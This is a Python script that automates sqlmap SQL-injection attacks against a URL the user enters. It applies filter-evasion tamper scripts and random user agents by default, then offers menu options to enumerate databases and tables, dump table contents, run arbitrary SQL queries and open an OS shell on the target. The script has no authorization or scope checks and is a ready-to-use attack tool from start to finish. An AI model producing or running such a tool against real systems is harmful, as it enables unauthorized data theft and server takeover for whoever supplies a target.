import os

import subprocess

import sys

from termcolor import colored



def print_banner():

    banner = """

    ===========================================

       Advanced SQLMap Automation Framework

    ===========================================

    """

    print(colored(banner, "cyan"))



def get_target_url():

    print(colored("Enter the target URL:", "green"))

    return input("URL: ").strip()



def select_tamper_scripts():

    tamper_scripts = [

        "space2comment",

        "randomcase",

        "between",

        "charencode",

        "equaltolike",

        "greatest",

    ]

    print(colored("Selected tamper scripts:", "yellow"))

    print(" - " + "\n - ".join(tamper_scripts))

    return ",".join(tamper_scripts)



def run_sqlmap(url, tamper_scripts):

    base_cmd = [

        "sqlmap",

        "-u", url,

        "--batch",

        "--random-agent",

        "--tamper", tamper_scripts,

        "--dbs"

    ]

    print(colored("Running SQLMap to enumerate databases...", "cyan"))

    try:

        subprocess.run(base_cmd, check=True)

    except subprocess.CalledProcessError:

        print(colored("Error occurred while running SQLMap.", "red"))





def advanced_testing(url, tamper_scripts):

    while True:

        print(colored("\nAdvanced Testing Options:", "yellow"))

        print("1. Enumerate Tables")

        print("2. Dump Table Data")

        print("3. Execute Custom SQL Query")

        print("4. Attempt OS Shell")

        print("5. Exit")



        choice = input(colored("Choose an option: ", "green"))



        if choice == "1":

            db_name = input("Enter database name: ").strip()

            cmd = [

                "sqlmap",

                "-u", url,

                "--batch",

                "--random-agent",

                "--tamper", tamper_scripts,

                "-D", db_name,

                "--tables"

            ]

            subprocess.run(cmd)

        elif choice == "2":

            db_name = input("Enter database name: ").strip()

            table_name = input("Enter table name: ").strip()

            cmd = [

                "sqlmap",

                "-u", url,

                "--batch",

                "--random-agent",

                "--tamper", tamper_scripts,

                "-D", db_name,

                "-T", table_name,

                "--dump"

            ]

            subprocess.run(cmd)

        elif choice == "3":

            query = input("Enter your custom SQL query: ").strip()

            cmd = [

                "sqlmap",

                "-u", url,

                "--batch",

                "--random-agent",

                "--tamper", tamper_scripts,

                "--sql-query", query

            ]

            subprocess.run(cmd)

        elif choice == "4":

            cmd = [

                "sqlmap",

                "-u", url,

                "--random-agent",

                "--tamper", tamper_scripts,

                "--os-shell"

            ]

            subprocess.run(cmd)

        elif choice == "5":

            print(colored("Exiting advanced testing...", "cyan"))

            break

        else:

            print(colored("Invalid choice. Try again.", "red"))



if __name__ == "__main__":

    print_banner()

    target_url = get_target_url()

    tamper_scripts = select_tamper_scripts()

    run_sqlmap(target_url, tamper_scripts)

    advanced_testing(target_url, tamper_scripts)

